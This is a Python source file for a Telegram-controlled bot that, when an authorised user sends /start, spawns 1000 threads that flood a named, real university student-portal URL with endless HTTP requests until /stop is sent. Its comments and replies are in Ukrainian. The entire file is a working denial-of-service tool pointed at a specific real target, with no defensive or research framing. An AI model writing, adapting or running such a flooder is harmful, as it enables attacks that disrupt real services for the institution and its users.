import threading
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

target = "https://iq.vntu.edu.ua/b04213/stud_cab/index.php"
num_threads = 1000
running = False

# Список користувачів, яким дозволено віддавати команди
allowed_users = ['']

def attack():
    while running:
        try:
            response = requests.get(target)
            print(f"Response Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

def start_requests():
    global running
    if not running:
        running = True
        for _ in range(num_threads):
            thread = threading.Thread(target=attack)
            thread.start()
        print("Запити почались!")
    else:
        print("Запити вже запущені!")

def stop_requests():
    global running
    running = False
    print("Запити зупинено!")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Pong")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    if user in allowed_users:
        if running:
            await update.message.reply_text("Запити вже надсилаються")
        else:
            await update.message.reply_text("Запити почались!")
            start_requests()

    else:
        await update.message.reply_text("У вас немає доступу до цієї команди.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    if user in allowed_users:
        if not running:
            await update.message.reply_text("Запити вже зупинено")
        else:
            await update.message.reply_text("Запити зупинено!")
            stop_requests()

    else:
        await update.message.reply_text("У вас немає доступу до цієї команди.")

def main():
    # Введіть ваш токен бота
    app = ApplicationBuilder().token("Bot_token").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("ping", ping))

    app.run_polling()

if __name__ == '__main__':
    main()
